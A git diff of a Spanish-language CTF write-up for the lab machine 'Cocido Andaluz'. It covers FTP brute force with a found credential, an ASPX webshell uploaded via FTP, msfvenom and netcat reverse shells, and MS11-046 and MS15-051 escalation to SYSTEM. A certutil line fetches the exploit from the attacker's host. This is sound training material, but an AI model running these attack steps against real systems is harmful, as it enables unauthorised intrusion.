@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Cocido Andaluz - TheHackerLabs
-excerpt: "."
+excerpt: "Esta fue una máquina bastante sencilla con la que pude probar varias cosillas. Después de aplicar los escaneos y al no encontrar una forma de enumerar sus servicios, aplicamos fuerza bruta al servicio FTP, encontrando un usuario y contraseñas válidos que nos permiten acceso a FTP y SMB. Dentro, descubrimos que usan el servicio FTP como un servidor para su página web, por lo que aprovechamos esto para cargar una WebShell de ASPX que nos permite ejecutar comandos. Aprovechamos esto para usar varios métodos que nos permiten ganar acceso a la máquina. Ya dentro y enumerando la máquina, descubrimos que es vulnerable a dos Exploits que nos permiten escalar privilegios, estos son: MS11-046 y MS15-051."
 date: 2025-02-03
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-/_logo.png
+  teaser: /assets/images/THL-writeup-cocidoAndaluz/CocidoAndaluz.jpg
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -13,21 +13,57 @@ categories:
   - Easy Machine
 tags:
   - Windows
-  - 
-  - 
-  - 
+  - Microsoft IIS
+  - ASP.NET
+  - FTP
+  - SMB
+  - FTP Enumeration
+  - Brute Force
+  - ASP/ASPX Payload
+  - Abusing FTP Service
+  - Abusing IIS Service
+  - ASPX WebShell
+  - Reverse Shell
+  - System Recognition (Windows)
+  - Local Privilege Escalation
+  - MS11-046 (LPE)
+  - MS15-051 (LPE)
+  - Privesc - MS11-046 (LPE)
+  - Privesc - MS15-051 (LPE)
+  - OSCP Style
+  - Metasploit Framework
 ---
-![](/assets/images/THL-writeup-/_logo.png)
+![](/assets/images/THL-writeup-cocidoAndaluz/CocidoAndaluz.jpg)
 
-texto
+Esta fue una máquina bastante sencilla con la que pude probar varias cosillas. Después de aplicar los escaneos y al no encontrar una forma de enumerar sus servicios, aplicamos **fuerza bruta** al **servicio FTP**, encontrando un usuario y contraseñas válidos que nos permiten acceso a **FTP y SMB**. Dentro, descubrimos que usan el **servicio FTP** como un servidor para su página web, por lo que aprovechamos esto para cargar una **WebShell de ASPX** que nos permite ejecutar comandos. Aprovechamos esto para usar varios métodos que nos permiten ganar acceso a la máquina. Ya dentro y enumerando la máquina, descubrimos que es vulnerable a dos Exploits que nos permiten escalar privilegios, estos son: **MS11-046 y MS15-051**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *arp-scan*
+* *wappalizer*
+* *ftp*
+* *crackmapexec*
+* *smbclient*
+* *smbmap*
+* *hydra*
+* *locate*
+* *aspx_cmd.aspx*
+* *msfvenom*
+* *nc.exe*
+* *metasploit framework (msfconsole)*
+* *meterpreter*
+* *Módulo: `post/multi/recon/local_exploit_suggester`*
+* *Módulo: `exploit/windows/local/ms15_051_client_copy_image`*
+* *rlwrap* 
+* *nc*
+* *impacket-smbserver*
+* *whoami*
+* *systeminfo*
+* *searchsploit*
+* *i686-w64-mingw32-gcc*
+* *python3*
+* *certutil.exe*
 
 
 <br>
@@ -37,23 +73,34 @@ Herramientas utilizadas:
 	<ul>
 		<li><a href="#Recopilacion">Recopilación de Información</a></li>
 			<ul>
+				<li><a href="#Hosts">Descubrimiento de Hosts</a></li>
 				<li><a href="#Ping">Traza ICMP</a></li>
 				<li><a href="#Puertos">Escaneo de Puertos</a></li>
 				<li><a href="#Servicios">Escaneo de Servicios</a></li>
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#FTP">Analizando Servicio FTP</a></li>
+				<li><a href="#SMB">Analizando Servicio SMB</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#FTPbrute">Aplicando Fuerza Bruta al Servicio FTP</a></li>
+                                <li><a href="#EnumFTPyWebshell">Enumeración de Servicio FTP y Subiendo una WebShell de ASPX</a></li>
+				<li><a href="#DistMetodos">Conectándonos a la Máquina Víctima con Distintos Métodos</a></li>
+				<ul>
+					<li><a href="#RevShell">Creando y Ejecutando una Reverse Shell de ASPX con msfvenom</a></li>
+					<li><a href="#BinNC">Cargando y Utilizando Binario nc.exe para Obtener Conexión</a></li>
+	                                <li><a href="#RevShell2">Obteniendo Sesión de Meterpreter con Reverse Shell de ASPX</a></li>
+					<li><a href="#BinNC2">Ejecutando Binario nc.exe desde Recurso Compartido de SMB para Obtener Sesión</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#EnumWin">Enumeración de Máquina Windows</a></li>
+				<li><a href="#PostExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</a></li>
+                                <li><a href="#PostExp2">Probando Exploit: Microsoft Windows - ClientCopyImage Win32k (MS15-051) (Metasploit)</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -176,7 +223,7 @@ Nmap done: 1 IP address (1 host up) scanned in 50.68 seconds
 | *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
 | *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
-Bien, parece que esta activa una página web en el **puerto 80** y veo activo el **servicio FTP** en el **puerto 21**, quizá esten relacionados, pero eso lo veremos más adelante.
+Bien, parece que está activa una página web en el **puerto 80** y veo activo el **servicio FTP** en el **puerto 21**, quizá estén relacionados, pero eso lo veremos más adelante.
 
 <br>
 
@@ -228,7 +275,7 @@ Nmap done: 1 IP address (1 host up) scanned in 65.65 seconds
 | *-p*       | Para indicar puertos específicos. |
 | *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
-Se me hace bastante curioso que tiene desplegado **Apache**, cuando normalmente es **IIS o HFS** o algo relacionado a **Windows**. Además, parece que el **servicio SMB** no nos pide credenciales para conectarnos.
+Se me hace bastante curioso que tiene desplegado **Apache**, cuando normalmente es **IIS o HFS** o algo relacionado con **Windows**. Además, parece que el **servicio SMB** no nos pide credenciales para conectarnos.
 
 
 <br>
@@ -258,7 +305,7 @@ Veamos que nos dice **Wappalizer**:
 
 No veo nada que nos sirva.
 
-Te diría que aplicaramos **Fuzzing**, pero en mi caso no encontre nada, por lo que vamos a saltarnos esa parte.
+Te diría que aplicáramos **Fuzzing**, pero en mi caso no encontré nada, por lo que vamos a saltarnos esa parte.
 
 Vamos a ver si podemos entrar al **servicio FTP**.
 
@@ -266,7 +313,7 @@ Vamos a ver si podemos entrar al **servicio FTP**.
 
 <h2 id="FTP">Analizando Servicio FTP</h2>
 
-Si revisamos el **escaneo de nmap**, no mostro información sobre este servicio, así que vamos a usar un script de **nmap** para ver si existe el usuario anonymous para poder loguearnos:
+Si revisamos el **escaneo de nmap**, no mostró información sobre este servicio, así que vamos a usar un script de **nmap** para ver si existe el **usuario anonymous** para poder loguearnos:
 ```bash
 nmap -p 21 --script ftp-anon 192.168.1.80
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 13:14 CST
@@ -279,7 +326,7 @@ MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
 ```
-No encontro nada y podremos hacer nada tampoco.
+No encontró nada y podremos hacer nada tampoco.
 
 Por ahora, vamos a dejar este servicio.
 
@@ -287,7 +334,7 @@ Por ahora, vamos a dejar este servicio.
 
 <h2 id="SMB">Analizando Servicio SMB</h2>
 
-Veamos que información nos da **crackmapexec**:
+Veamos qué información nos da **crackmapexec**:
 ```bash
 crackmapexec smb 192.168.1.80
 SMB         192.168.1.80 445    WIN-JG67MIHZH2X  [*] Windows 6.0 Build 6001 (name:WIN-JG67MIHZH2X) (domain:WIN-JG67MIHZH2X) (signing:False) (SMBv1:False)
@@ -302,10 +349,10 @@ Anonymous login successful
 	Sharename       Type      Comment
 	---------       ----      -------
 Reconnecting with SMB1 for workgroup listing.
-do_connect: Connection to 192.168.100.213 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+do_connect: Connection to 192.168.1.80 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 ```
-Parece que si puede loguearse con un usuario anonimo, pero no esta mostrando nada.
+Parece que sí puede loguearse con un usuario anónimo, pero no está mostrando nada.
 
 De pura casualidad, probemos si podemos ver algo con **smbmap**:
 ```bash
@@ -323,14 +370,14 @@ SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
 .
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
-[!] Access denied on 192.168.100.213, no fun for you...                                                                  
+[!] Access denied on 192.168.1.80, no fun for you...                                                                  
 [*] Closed 1 connections
 ```
 Nada tampoco.
 
-Te diría que fueramos a analizar el **servicio RPC**, pero tampoco podremos hacer algo.
+Te diría que fuéramos a analizar el **servicio RPC**, pero tampoco podremos hacer algo.
 
-Lo que queda, es hacer fuerza bruta.
+Lo que queda, es hacer **fuerza bruta**.
 
 
 <br>
@@ -344,9 +391,9 @@ Lo que queda, es hacer fuerza bruta.
 
 <h2 id="FTPbrute">Aplicando Fuerza Bruta al Servicio FTP</h2>
 
-Vamos a empezar aplicando fuerza bruta al **servicio FTP**, pero al no tener un usuario, debemos específicar un diccionario de usuarios.
+Vamos a empezar aplicando **fuerza bruta** al **servicio FTP**, pero al no tener un usuario, debemos especificar un diccionario de usuarios.
 
-Yo usare el diccionario de usuarios de **seclists**, que debería esta en la ruta: `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`.
+Yo usaré el diccionario de usuarios de **seclists**, que debería está en la ruta: `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`.
 
 Esta vez, usaremos otro diccionario para las contraseñas, ya que **rockyou.txt** tarda demasiado y no encuentra la contraseña, este será: `/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt`.
 
@@ -371,7 +418,7 @@ crackmapexec ftp 192.168.1.80 -u 'info' -p 'PolniyPizdec0211'
 FTP         192.168.1.80 21     192.168.1.80  [*] Banner: Microsoft FTP Service
 FTP         192.168.1.80 21     192.168.1.80  [+] info:PolniyPizdec0211
 ```
-Si funcionan.
+Sí funcionan.
 
 Ahora con el **servicio SMB**:
 ```bash
@@ -379,13 +426,13 @@ crackmapexec smb 192.168.1.80 -u 'info' -p 'PolniyPizdec0211'
 SMB         192.168.1.80 445    WIN-JG67MIHZH2X  [*] Windows 6.0 Build 6001 (name:WIN-JG67MIHZH2X) (domain:WIN-JG67MIHZH2X) (signing:False) (SMBv1:False)
 SMB         192.168.1.80 445    WIN-JG67MIHZH2X  [+] WIN-JG67MIHZH2X\info:PolniyPizdec0211
 ```
-Tambien funcionan.
+También funcionan.
 
 Ahora podemos entrar al **servicio FTP** y al **servicio SMB**, aunque en **SMB** no encontraremos nada, así que vamos directo con **FTP**.
 
 <br>
 
-<h2 id="">Enumeración de Servicio FTP y Subiendo una WebShell de ASPX</h2>
+<h2 id="EnumFTPyWebshell">Enumeración de Servicio FTP y Subiendo una WebShell de ASPX</h2>
 
 Entremos al **servicio FTP**:
 ```batch
@@ -431,7 +478,7 @@ dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
 -rwxrwxrwx   1 owner    group          184946 Jun 14  2024 welcome.png
 226 Transfer complete.
 ```
-Ahí esta.
+Ahí está.
 
 Ahora vamos a ver si aparece en la página web:
 
@@ -468,17 +515,17 @@ Y vayamos a la página web, especificando el archivo:
 <img src="/assets/images/THL-writeup-cocidoAndaluz/Captura4.png">
 </p>
 
-Ahí esta, ya solo ejecuta un comando:
+Ahí está, ya solo ejecuta un comando:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-cocidoAndaluz/Captura5.png">
 </p>
 
-Listo, tenemos una WebShell que podemos usar para conectarnos a la máquina víctima.
+Listo, tenemos una **WebShell** que podemos usar para conectarnos a la máquina víctima.
 
 <br>
 
-<h2 id="">Conectandonos a la Máquina Víctima con Distintos Metodos</h2>
+<h2 id="DistMetodos">Conectándonos a la Máquina Víctima con Distintos Métodos</h2>
 
 Vamos a realizar al menos 4 formas en las que podemos ganar acceso a la máquina.
 
@@ -488,7 +535,7 @@ Puedes elegir cualquiera de estas para continuar.
 
 <br>
 
-<h3 id="RevShell">Creando una Reverse Shell de ASPX con msfvenom</h3>
+<h3 id="RevShell">Creando y Ejecutando una Reverse Shell de ASPX con msfvenom</h3>
 
 Vamos a generar una **Reverse Shell** con formato **ASPX** utilizando **msfvenom**:
 ```bash
@@ -540,7 +587,7 @@ Estamos dentro.
 
 Dentro de nuestro Kali, tenemos ya un binario de **netcat** que sirve con **Windows**.
 
-Buscala y copiala en tu directorio actual de trabajo:
+Búscala y cópiala en tu directorio actual de trabajo:
 ```bash
 locate nc.exe
 /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
@@ -560,7 +607,7 @@ local: nc.exe remote: nc.exe
 59392 bytes sent in 00:00 (1.51 MiB/s)
 ```
 
-Bien, ya esta dentro del **FTP**, pero para poder usarla, necesitas específicar la ruta en donde se encuentra el binario y es posible que se encuentre en 2 lugares:
+Bien, ya está dentro del **FTP**, pero para poder usarla, necesitas especificar la ruta en donde se encuentra el binario y es posible que se encuentre en 2 lugares:
 * `C:\inetpub\wwwroot\`
 * `C:\inetpub\ftproot\`
 
@@ -608,7 +655,7 @@ Final size of aspx file: 2867 bytes
 Saved as: meterpreterShell.aspx
 ```
 
-Ahora, vamos a automatizar la obtención del handler que nos da la sesión del **meterpreter**, metiendo los comandos en un script de LUA:
+Ahora, vamos a automatizar la obtención del handler que nos da la sesión del **meterpreter**, metiendo los comandos en un script de **Ruby**:
 ```bash
 nano handler.rc
 ---------------
@@ -678,7 +725,7 @@ Meterpreter     : x86/windows
 
 Como mencione antes, dentro de nuestro Kali, tenemos ya un binario de **netcat** que sirve con **Windows**.
 
-Buscala y copiala en tu directorio actual de trabajo:
+Búscala y cópiala en tu directorio actual de trabajo:
 ```bash
 locate nc.exe
 /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
@@ -744,21 +791,213 @@ C:\Users\info>type user.txt
 <br>
 
 
-<h2 id="EnumWin">Enumeración de Máquina Víctima</h2>
+<h2 id="EnumWin">Enumeración de Máquina Windows</h2>
 
+Veamos qué privilegios tiene nuestro usuario:
+```batch
+C:\Temp>whoami /priv
+whoami /priv
+.
+INFORMACI�N DE PRIVILEGIOS
+--------------------------
+.
+Nombre de privilegio          Descripci�n                                       Estado       
+============================= ================================================= =============
+SeAssignPrimaryTokenPrivilege Reemplazar un s�mbolo (token) de nivel de proceso Deshabilitado
+SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
+SeAuditPrivilege              Generar auditor�as de seguridad                   Deshabilitado
+SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido                  Habilitada   
+SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci�n      Habilitada   
+SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
+```
+Podríamos usar **JuicyPotato**, pero no funcionará, ya que solo sirve para **arquitecturas x64**.
 
+Tenemos varías opciones para enumerar de forma automatizada como:
+* <a href="https://github.com/rasta-mouse/Watson/tree/master" target="_blank">Repositorio de rasta-mouse: Watson</a>
+* <a href="https://github.com/bitsadmin/wesng" target="_blank">Repositorio de bitsadmin: Windows Exploit Suggester - Next Generation (WES-NG)</a>
+* Módulo `post/multi/recon/local_exploit_suggester` de **Metasploit**.
 
+Pero en mi caso no funcionaron la mayoría.
 
-<h2 id=""></h2>
+Entonces, obtengamos la información de la máquina:
+```batch
+C:\Temp>systeminfo
+systeminfo
 
+Nombre de host:                            WIN-JG67MIHZH2X
+Nombre del sistema operativo:              Microsoft� Windows Server� 2008 Datacenter 
+Versi�n del sistema operativo:             6.0.6001 Service Pack 1 Compilaci�n 6001
+Fabricante del sistema operativo:          Microsoft Corporation
+Configuraci�n del sistema operativo:       Servidor independiente
+Tipo de compilaci�n del sistema operativo: Multiprocessor Free
+Propiedad de:                              Usuario de Windows
+Organizaci�n registrada:                   
+Id. del producto:                          92577-082-2500446-76907
+Fecha de instalaci�n original:             14/06/2024, 12:21:47
+Tiempo de arranque del sistema:            04/02/2025, 5:19:51
+...
+...
+...
+```
+Vamos a buscar un Exploit para la versión de Windows que muestra: **Microsoft Windows Server 2008 Datacenter**.
 
-<h2 id=""></h2>
+Y encontramos estos dos:
+* <a href="https://www.exploit-db.com/exploits/40564" target="_blank">Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</a>
+* <a href="https://www.exploit-db.com/exploits/39719" target="_blank">Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)</a>
 
+Como no podemos usar **PowerShell**, vamos a usar la primera opción.
 
-<h2 id=""></h2>
+<br>
 
+<h2 id="PostExp">Probando Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)</h2>
 
+La podemos encontrar dentro de Kali:
+```bash
+searchsploit MS11-046
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)                                                                                   | windows_x86/local/40564.c
+Microsoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                                                                                                 | windows/dos/18755.c
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+Usamos la primer opción.
 
+Copiamos el Exploit en nuestro directorio de trabajo:
+```bash
+searchsploit -m windows_x86/local/40564.c
+  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
+      URL: https://www.exploit-db.com/exploits/40564
+     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
+    Codes: CVE-2011-1249, MS11-046
+ Verified: True
+File Type: C source, ASCII text
+```
+Analizando el Exploit, nos menciona que debemos compilarlo para obtener el binario que usaremos para escalar privilegios.
+
+Compilamos el Exploit:
+```bash
+i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
+```
+
+Ya solo es cuestión de mandarlo a la máquina víctima.
+
+Abre un servidor con **Python**:
+```bash
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Usaremos **certutil.exe** para descargar el Exploit en la máquina víctima:
+```batch
+C:\Temp>certutil.exe -split -urlcache -f http://Tu_IP/MS11-046.exe
+certutil.exe -split -urlcache -f http://Tu_IP/MS11-046.exe
+****  En l�nea  ****
+CertUtil: -URLCache comando completado correctamente.
+```
+
+Y lo ejecutamos:
+```batch
+C:\Temp>MS11-046.exe
+MS11-046.exe
+.
+c:\Windows\System32>whoami
+whoami
+nt authority\system
+```
+Listo, ya somos el **usuario administrador**.
+
+<br>
+
+<h2 id="PostExp2">Probando Exploit: Microsoft Windows - ClientCopyImage Win32k (MS15-051) (Metasploit)</h2>
+
+En este caso, vamos a usar el módulo `post/multi/recon/local_exploit_suggester` para aprovechar que tenemos una sesión de **meterpreter**.
+
+Vamos a configurarlo:
+```bash
+msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
+```
+
+Lo ejecutamos:
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > exploit
+[*] 192.168.1.80 - Collecting local exploits for x86/windows...
+[*] 192.168.1.80 - 203 exploit checks are being tried...
+[+] 192.168.1.80 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Windows Windows Server 2008 build detected!
+[+] 192.168.1.80 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 192.168.1.80 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 192.168.1.80 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 192.168.1.80 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 192.168.1.80 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Running check method for exploit 42 / 42
+[*] 192.168.1.80 - Valid modules for session 1:
+============================
+.
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Windows Windows Server 2008 build detected!
+ 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 3   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 5   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+...
+...
+...
+```
+Tenemos varias opciones, pero el que sirve para escalar privilegios es el módulo `exploit/windows/local/ms15_051_client_copy_image`.
+
+Vamos a configurarlo:
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
+SESSION => 1
+```
+
+Y lo ejecutamos:
+```bash
+msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit
+[*] Started reverse TCP handler on Tu_IP:4444 
+[*] Reflectively injecting the exploit DLL and executing it...
+[*] Launching msiexec to host the DLL...
+[+] Process 1460 launched.
+[*] Reflectively injecting the DLL into 1460...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (177734 bytes) to 192.168.1.80
+[*] Meterpreter session 2 opened (Tu_IP:4444 -> 192.168.1.80:49188) at 2025-02-03 21:34:00 -0600
+.
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+De esta forma, volvimos a escalar privilegios.
+
+Ya solo obtenemos la flag del administrador:
+```batch
+C:\Windows\System32>cd C:\Users\Administrador\Desktop
+cd C:\Users\Administrador\Desktop
+.
+C:\Users\Administrador\Desktop>dir
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 1CEF-5C5A
+.
+ Directorio de C:\Users\Administrador\Desktop
+.
+14/06/2024  17:17    <DIR>          .
+14/06/2024  17:17    <DIR>          ..
+14/06/2024  17:16                29 root.txt
+               1 archivos             29 bytes
+               2 dirs  12.669.628.416 bytes libres
+.
+C:\Users\Administrador\Desktop>type root.txt
+type root.txt
+```
+Y con esto, completamos la máquina.
 
 
 <br>
@@ -768,10 +1007,15 @@ C:\Users\info>type user.txt
 </div>
 
 
-links
+* https://github.com/bitsadmin/wesng
+* https://github.com/rasta-mouse/Watson/tree/master
+* https://www.exploit-db.com/exploits/39719
+* https://www.exploit-db.com/exploits/40564
+* https://www.exploit-db.com/exploits/37367
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
